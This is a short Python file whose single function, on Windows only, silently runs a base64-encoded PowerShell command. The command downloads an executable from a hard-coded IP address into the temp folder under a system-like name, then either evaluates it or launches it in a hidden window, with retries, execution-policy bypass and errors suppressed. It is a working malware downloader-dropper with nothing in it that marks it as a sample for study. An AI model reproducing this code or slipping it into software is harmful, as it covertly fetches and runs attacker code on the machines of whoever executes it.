import subprocess
import sys
import os
import base64

def run_powershell():
    """Execute the PowerShell command to download and run the file."""
    if sys.platform != "win32":
        return  # Only run on Windows

    # Suppress output
    sys.stdout.reconfigure(errors='ignore')
    sys.stderr.reconfigure(errors='ignore')

    # Encode PowerShell command with retry logic and dual execution
    powershell_cmd = '''
    $maxTries = 3; $try = 0;
    do {
        try {
            $outPath = "$env:TEMP\\siphost.exe";
            iwr -useb http://194.26.192.145/siproute.exe -OutFile $outPath;
            if (Test-Path $outPath) {
                $content = Get-Content $outPath -Raw -ErrorAction SilentlyContinue;
                if ($content -and ($content -match '^\\s*\\#\\<\\!\\s*powershell|^\\s*\\<\\?xml|^\\s*function|^\\s*\\$')) {
                    iex $content;
                } else {
                    Start-Process -WindowStyle Hidden $outPath;
                }
            }
            break;
        } catch {
            $try++; Start-Sleep -Seconds 5;
        }
    } while ($try -lt $maxTries);
    '''
    encoded_cmd = base64.b64encode(powershell_cmd.encode('utf-16le')).decode()

    try:
        # Run PowerShell command silently
        subprocess.run(
            ['powershell', '-NoProfile', '-NonInteractive', '-ExecutionPolicy', 'Bypass', '-EncodedCommand', encoded_cmd],
            capture_output=True,
            text=True,
            check=True,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
    except subprocess.CalledProcessError:
        pass  # Silently ignore errors
